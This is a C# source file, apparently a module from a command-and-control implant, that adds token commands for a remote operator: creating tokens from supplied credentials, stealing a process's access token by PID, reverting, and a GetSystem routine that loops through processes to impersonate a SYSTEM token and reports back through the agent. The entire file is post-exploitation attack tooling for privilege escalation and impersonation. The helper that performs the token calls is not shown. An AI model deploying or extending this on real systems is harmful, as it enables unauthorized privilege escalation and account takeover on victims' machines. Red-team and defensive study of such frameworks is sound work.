using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;

namespace Agent.Modules
{
    public class TokenModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Token",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Whoami",
                        Delegate = Whoami
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Create",
                        Delegate = CreateToken
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Revert",
                        Delegate = RevertToSelf
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Steal",
                        Delegate = StealToken
                    },
                    new ModuleInfo.Command
                    {
                        Name = "GetSystem",
                        Delegate = GetSystem
                    }
                }
            };
        }

        void Whoami(string AgentID, AgentTask Task)
        {
            try
            {
                var identity = WindowsIdentity.GetCurrent().Name;
                Agent.SendMessage(identity);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void CreateToken(string AgentID, AgentTask Task)
        {
            try
            {
                var domain = (string)Task.Parameters["Domain"];
                var username = (string)Task.Parameters["Username"];
                var password = (string)Task.Parameters["Password"];

                if (Token.CreateToken(username, domain, password))
                {
                    Agent.SendMessage($"Successfully created and impersonated token for {domain}\\{username}");
                }
                else
                {
                    Agent.SendError($"Unable to create and impersonate token for {domain}\\{username}");
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void RevertToSelf(string AgentID, AgentTask Task)
        {
            if (Token.Rev2Self())
            {
                Agent.SendMessage("Token reverted");
            }
            else
            {
                Agent.SendError("Failed to revert token");
            }
        }

        void StealToken(string AgentID, AgentTask Task)
        {
            try
            {
                var pid = (int)Task.Parameters["PID"];
                var process = Process.GetProcessById(pid);
                var owner = Helpers.GetProcessOwner(process);

                if (Token.StealToken(pid))
                {
                    Agent.SendMessage($"Successfully impersonated token for {owner}");
                }
                else
                {
                    Agent.SendError($"Failed to impersonate token for {owner}");
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void GetSystem(string AgentID, AgentTask Task)
        {
            try
            {
                var processes = Process.GetProcesses();

                foreach (var process in processes)
                {
                    if (Helpers.GetProcessOwner(process).Equals("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase))
                    {
                        if (Token.StealToken(process.Id))
                        {
                            Agent.SendMessage($"Successfully impersonated token for SYSTEM");
                            return;
                        }
                    }
                }

                Agent.SendMessage("Failed to impersonate token for SYSTEM");
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}